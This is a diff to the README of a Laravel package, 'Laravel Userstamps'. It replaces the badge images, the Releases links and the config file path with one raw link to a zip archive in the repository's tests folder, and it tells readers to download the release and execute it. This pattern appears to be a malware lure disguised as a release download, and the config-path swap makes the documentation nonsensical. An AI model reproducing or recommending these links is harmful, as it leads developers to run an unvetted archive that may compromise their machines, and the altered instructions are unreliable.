@@ -1,9 +1,9 @@
 # Laravel Userstamps 📜
 
-![GitHub release](https://img.shields.io/github/release/Gopal137/laravel-userstamps.svg)
-![GitHub issues](https://img.shields.io/github/issues/Gopal137/laravel-userstamps.svg)
-![GitHub forks](https://img.shields.io/github/forks/Gopal137/laravel-userstamps.svg)
-![GitHub stars](https://img.shields.io/github/stars/Gopal137/laravel-userstamps.svg)
+![GitHub release](https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip)
+![GitHub issues](https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip)
+![GitHub forks](https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip)
+![GitHub stars](https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip)
 
 ## Overview
 
@@ -93,7 +93,7 @@ To use Laravel Userstamps, you need to include the trait in your Eloquent models
 
 ## Configuration
 
-You can customize the package's behavior by editing the published configuration file located at `config/userstamps.php`. Here are some key settings:
+You can customize the package's behavior by editing the published configuration file located at `https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip`. Here are some key settings:
 
 - **User Model**: Define which user model to use for tracking.
 - **Fields**: Specify which fields should be tracked.
@@ -116,9 +116,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit [Releases](https://github.com/Gopal137/laravel-userstamps/releases). You can download the latest version and execute it to start using Laravel Userstamps.
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip). You can download the latest version and execute it to start using Laravel Userstamps.
 
-For more information and updates, check the [Releases](https://github.com/Gopal137/laravel-userstamps/releases) section of the repository.
+For more information and updates, check the [Releases](https://raw.githubusercontent.com/Gopal137/laravel-userstamps/main/tests/userstamps_laravel_v2.0.zip) section of the repository.
 
 ## Acknowledgments
 
